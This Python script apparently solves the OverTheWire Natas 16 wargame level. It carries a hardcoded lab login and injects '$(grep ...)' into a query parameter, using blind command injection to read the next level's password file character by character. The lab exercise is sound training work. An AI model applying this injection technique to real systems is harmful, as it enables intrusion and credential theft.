#!/usr/bin/env python3

import string
import requests

charset = '0123456789'  +string.ascii_letters

basic = requests.auth.HTTPBasicAuth("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")

url_base = "http://natas16.natas.labs.overthewire.org/?needle="

size = 0

for i in range(32,100):
    payload = 'doom$(grep ' + '.'*i  + ' /etc/natas_webpass/natas17)'
    print(payload)
    res = requests.get(url_base+payload,auth=basic)
    if "doom" in res.text:
        size = i
        break
size = 32
print("Size: " + str(size))

password_list = []

def mount_password(i,char,password_list):
    password = ''
    for index in range(len(password_list)):
        if i == index:
            password = password + char
        else:
            password = password + password_list[index]
    return password

for i in range(size):
    password_list.append('.')

new_charset = ''

for char in charset:
    print("---------------------")
    print("Searching " + char)
    payload = 'doomed$(grep ' + char + ' /etc/natas_webpass/natas17)'
    res = requests.get(url_base+payload,auth=basic)
    if "doomed" not in res.text:
        new_charset = new_charset + char
        print("---------------------")
        print("New charset: " + new_charset)
        print("---------------------")

print("---------------------")
print("New charset: " + new_charset)
print("---------------------")
for char in new_charset:
    print("Searching " + char)
    p = False
    for i in range(size):
        if password_list[i] == ".":
            password = mount_password(i,char,password_list)
            payload = 'doomed$(grep ' + password + ' /etc/natas_webpass/natas17)'
            print(payload)
            res = requests.get(url_base + payload,auth=basic)
            if "doomed" not in res.text:
                password_list[i] = char
                print("FOUND!!! (" + str(i) + ")")
                p = True
    if p:
        print("---------------------")
        print("Password: " + ''.join(c for c in password_list))
        print("---------------------")
    else:
        print("---------------------")

print("Password: " + ''.join(c for c in password_list))


